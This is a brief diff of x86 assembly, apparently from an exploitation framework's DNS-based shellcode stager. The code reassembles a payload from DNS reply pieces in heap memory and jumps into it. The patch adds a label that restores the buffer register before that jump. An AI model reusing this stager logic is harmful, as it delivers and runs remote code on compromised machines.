@@ -227,7 +227,7 @@ get_query_result:
 	pop #{bufferreg}	; heap structure containing DNS results
 	mov eax,[#{bufferreg}]	; if first dword has a non-null value, then stop
 	test eax,eax
-	jnz jump_to_payload
+	jnz prepare_payload	; jmp to payload
 	add #{bufferreg},#{wTypeOffset}	; get ptr to ptr to DNS reply
 	mov #{bufferreg},[#{bufferreg}] ; get ptr to DNS reply
 
@@ -244,6 +244,9 @@ copy_piece_to_heap:
 	inc ebx			; increment sequence
 	xchg #{bufferreg},edx	; restore start of heap
 	jmp dnsquery		; try to get the next piece, if any
+
+prepare_payload:
+	mov #{bufferreg},edx
 
 jump_to_payload:
 	jmp #{bufferreg}	; jump to it
